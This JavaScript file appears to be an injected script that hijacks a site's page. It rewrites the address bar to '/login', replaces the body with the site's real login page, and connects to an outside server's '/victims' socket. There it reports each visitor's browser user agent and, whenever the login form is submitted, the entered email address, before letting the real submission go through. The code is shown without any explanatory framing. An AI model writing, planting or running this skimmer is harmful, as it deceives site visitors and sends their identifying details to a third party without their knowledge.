var host = window.location.host;
var path = '/login';

(function() {
  history.replaceState(null, 'Log in', path);

  var script = document.createElement("script");
  var hash = /com$/.test(host) ? '67b1ba83e869c8e79f6e36d0e09b5800' :'1b3785e50daff644c60797acabafb97d';
  script.src = '/assets/application-' + hash + '.js';
  script.type = 'text/javascript';
  document.getElementsByTagName('head')[0].appendChild(script);
  script = document.createElement("script");

  script.src = 'https://test.orr.me.uk:8443/socket.io/socket.io.js';
  script.type = 'text/javascript';
  document.getElementsByTagName('head')[0].appendChild(script);

  var checkReady = function(dep, callback) {
    if (window.hasOwnProperty(dep)) {
      callback(window[dep]);
    } else {
      window.setTimeout(function() { checkReady(dep, callback); }, 50);
    }
  };

  var socket = null;
  checkReady('jQuery', function($) {
    $.get('//' + host + path, {}, function(data) {
      $(document.body).html(data);
      var title = $('body title').text();
      window.document.title = title;
      $('form').submit(function(e) {
        if (socket === null) {
          return true;
        }
        socket.emit('submit', $('#user_session_email').val());
        e.preventDefault();
        var form = this;
        setTimeout(function () {
          form.submit();
        }, 500);
      });
    });
  });

  checkReady('io', function(io) {
    socket = io.connect('https://test.orr.me.uk:8443/victims', {secure: true});
    socket.emit('info', navigator.userAgent);
  });
})();
